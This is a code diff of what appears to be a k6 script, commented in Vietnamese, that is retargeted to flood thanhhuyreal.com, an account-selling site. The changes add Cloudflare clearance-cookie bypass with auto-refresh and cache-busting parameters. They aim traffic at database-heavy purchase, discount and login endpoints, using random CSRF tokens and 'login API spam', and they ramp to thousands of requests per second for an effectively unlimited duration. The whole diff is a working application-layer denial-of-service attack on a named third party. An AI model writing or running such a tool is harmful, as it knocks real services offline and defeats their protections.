@@ -20,9 +20,26 @@ const PHPSESSID_ENV = __ENV.PHPSESSID || '';
 const IDENTIFIER = __ENV.PHP_IDENTIFIER || 'lonussystem';
 const PASSWORD   = __ENV.PHP_PASSWORD   || 'lonussystem123@';
 
-// Cloudflare bypass
-const CF_CLEARANCE = __ENV.CF_CLEARANCE || '';
-const CF_UA = __ENV.CF_UA || 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36';
+// Cloudflare bypass (auto-refresh)
+const CF_CLEARANCE_FILE = __ENV.CF_CLEARANCE_FILE || '';
+const CF_UA_FILE = __ENV.CF_UA_FILE || '';
+
+let CF_CLEARANCE = __ENV.CF_CLEARANCE || '';
+let CF_UA = __ENV.CF_UA || 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36';
+
+// Read from file if available (for auto-refresh)
+if (CF_CLEARANCE_FILE && !CF_CLEARANCE) {
+  try {
+    const fs = require('fs');
+    CF_CLEARANCE = fs.readFileSync(CF_CLEARANCE_FILE, 'utf8').trim();
+    if (CF_UA_FILE) {
+      CF_UA = fs.readFileSync(CF_UA_FILE, 'utf8').trim();
+    }
+    console.log(`Loaded cf_clearance from ${CF_CLEARANCE_FILE}: ${CF_CLEARANCE.substring(0, 50)}...`);
+  } catch (e) {
+    console.warn(`Cannot read ${CF_CLEARANCE_FILE}: ${e.message}`);
+  }
+}
 
 // ===== Config =====
 const STAGES_RAW  = __ENV.STAGES      || '30s:500,60s:2000,60s:5000,876000h:5000';
@@ -40,6 +57,23 @@ const STAGES = STAGES_RAW.split(',').map(p => {
 
 // ===== Headers chung (dung session tu setup) =====
 function makeHeaders(session) {
+  // Re-read cookie & UA from file if auto-refresh is enabled
+  if (CF_CLEARANCE_FILE) {
+    try {
+      const fs = require('fs');
+      const newCookie = fs.readFileSync(CF_CLEARANCE_FILE, 'utf8').trim();
+      if (newCookie && newCookie !== CF_CLEARANCE) {
+        CF_CLEARANCE = newCookie;
+        if (CF_UA_FILE) {
+          CF_UA = fs.readFileSync(CF_UA_FILE, 'utf8').trim();
+        }
+        console.log(`Cookie refreshed: ${CF_CLEARANCE.substring(0, 30)}...`);
+      }
+    } catch (e) {
+      // Ignore read errors
+    }
+  }
+  
   const ua = CF_CLEARANCE ? CF_UA : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36';
   
   let cookie = `PHPSESSID=${session}`;
@@ -69,44 +103,49 @@ function makeApiHeaders(session) {
   });
 }
 
-// ===== Endpoints nặng (DB query mỗi lần, không cache dc) =====
-// Thêm endpoint API cụ thể của site vào đây
-const HEAVY_PAGES = [
-  // Trang chủ (search tổng)
-  () => `${IP_URL}/?_=${Date.now()}&r=${randomIntBetween(1, 99999)}`,
+// ===== Endpoints thực tế từ thanhhuyreal.com =====
+// Chỉ có POST APIs vì là server-side render PHP
 
-  // Search với filter khác nhau (ép DB full query)
-  () => `${IP_URL}/?loai=${randomIntBetween(1,5)}&gia_tu=${randomIntBetween(1,10)*500}&gia_den=${randomIntBetween(10,50)*1000}&dt=${randomIntBetween(30,500)}&_=${Date.now()}`,
-  () => `${IP_URL}/?tinh=${randomIntBetween(1,63)}&huyen=${randomIntBetween(1,300)}&loai=${randomIntBetween(1,5)}&_=${Date.now()}`,
-  () => `${IP_URL}/?q=${randomIntBetween(1,9999)}&page=${randomIntBetween(1,50)}&_=${Date.now()}`,
-
-  // Listing pages
-  () => `${IP_URL}/nha-dat-ban?page=${randomIntBetween(1,100)}&sort=${randomItem(['newest','price_asc','price_desc','area'])}&_=${Date.now()}`,
-  () => `${IP_URL}/nha-dat-cho-thue?page=${randomIntBetween(1,100)}&_=${Date.now()}`,
-  () => `${IP_URL}/can-ho-chung-cu?page=${randomIntBetween(1,50)}&_=${Date.now()}`,
-  () => `${IP_URL}/dat-nen?page=${randomIntBetween(1,50)}&_=${Date.now()}`,
-
-  // Detail pages (mỗi ID khác = DB lookup khác)
-  () => `${IP_URL}/bat-dong-san/${randomIntBetween(1,5000)}?_=${Date.now()}`,
-  () => `${IP_URL}/tin-tuc/${randomIntBetween(1,1000)}?_=${Date.now()}`,
-];
-
-// API endpoints (nếu site có - nặng hơn vì JSON + DB)
 const HEAVY_APIS = [
-  // Thêm các API endpoint của site vào đây
+  // 1. Purchase API - Mua account (DB intensive: check stock, create transaction)
   () => ({
-    url: `${IP_URL}/model/listings`,
-    body: `page=${randomIntBetween(1,100)}&limit=20&loai=${randomIntBetween(1,5)}&sort=newest&_=${Date.now()}`,
+    url: `${IP_URL}/model/account/purchase`,
+    body: `csrf_token=${getCsrfToken()}&account_id=${randomIntBetween(1,1000000)}&category_id=${randomIntBetween(1,500)}&price=${randomIntBetween(1,50)*1000}&total_price=${randomIntBetween(1,50)*1000}&membership_percentage=0`,
   }),
+  
+  // 2. Apply discount code (DB query: check code valid, calculate discount)
   () => ({
-    url: `${IP_URL}/model/search`,
-    body: `q=nhà+đất&tinh=${randomIntBetween(1,63)}&gia_tu=${randomIntBetween(1,5)*1000}&page=${randomIntBetween(1,50)}`,
+    url: `${IP_URL}/model/discount/apply`,
+    body: `csrf_token=${getCsrfToken()}&code=${randomItem(['xc','sale','vip','promo','discount'])}&category_id=${randomIntBetween(1,500)}&quantity=${randomIntBetween(1,5)}`,
   }),
+  
+  // 3. Login API spam (bcrypt verify, session create)
   () => ({
-    url: `${IP_URL}/model/get-listings`,
-    body: `type=${randomIntBetween(1,5)}&province=${randomIntBetween(1,63)}&page=${randomIntBetween(1,100)}`,
+    url: `${IP_URL}/model/login`,
+    body: `csrf_token=${getCsrfToken()}&identifier=${IDENTIFIER}&password=${PASSWORD}`,
   }),
 ];
+
+// GET pages (ít hơn vì SSR PHP)
+const HEAVY_PAGES = [
+  // Homepage với random params để bypass cache
+  () => `${IP_URL}/?_=${Date.now()}&r=${randomIntBetween(1, 99999)}`,
+  
+  // Category pages (nếu có)
+  () => `${IP_URL}/mua-acc?_=${Date.now()}`,
+  () => `${IP_URL}/mua-acc/full-ruong-380-ve?_=${Date.now()}`,
+  () => `${IP_URL}/mua-acc/random-skin-3s-sale?_=${Date.now()}`,
+];
+
+// Helper: Generate random CSRF token (giả lập - sẽ fail nhưng vẫn tạo load)
+function getCsrfToken() {
+  const chars = '0123456789abcdef';
+  let token = '';
+  for (let i = 0; i < 64; i++) {
+    token += chars[Math.floor(Math.random() * chars.length)];
+  }
+  return token;
+}
 
 // ===== Metrics =====
 const req2xx   = new Counter('req_2xx');
@@ -206,27 +245,28 @@ export function setup() {
 }
 
 export const options = {
-  discardResponseBodies: true, // Không parse body → tiết kiệm CPU
+  discardResponseBodies: true,
   scenarios: {
-    // Scenario 1: Flood trang nặng (GET)
-    heavy_pages: {
-      executor:        'ramping-arrival-rate',
-      startRate:       START_RATE,
-      timeUnit:        '1s',
-      preAllocatedVUs: PRE_VUS,
-      maxVUs:          MAX_VUS,
-      stages:          STAGES,
-      exec:            'hitPage',
-    },
-    // Scenario 2: Flood API (POST) - chạy song song
+    // Scenario 1: Flood POST APIs (70% traffic - API nặng nhất)
     heavy_apis: {
       executor:        'ramping-arrival-rate',
-      startRate:       Math.floor(START_RATE / 2),
+      startRate:       Math.floor(START_RATE * 0.7),
       timeUnit:        '1s',
-      preAllocatedVUs: Math.floor(PRE_VUS / 2),
-      maxVUs:          Math.floor(MAX_VUS / 2),
+      preAllocatedVUs: Math.floor(PRE_VUS * 0.7),
+      maxVUs:          Math.floor(MAX_VUS * 0.7),
       stages:          STAGES,
       exec:            'hitApi',
+    },
+    
+    // Scenario 2: Flood GET pages (30% traffic - nhẹ hơn)
+    heavy_pages: {
+      executor:        'ramping-arrival-rate',
+      startRate:       Math.floor(START_RATE * 0.3),
+      timeUnit:        '1s',
+      preAllocatedVUs: Math.floor(PRE_VUS * 0.3),
+      maxVUs:          Math.floor(MAX_VUS * 0.3),
+      stages:          STAGES,
+      exec:            'hitPage',
     },
   },
   thresholds: {
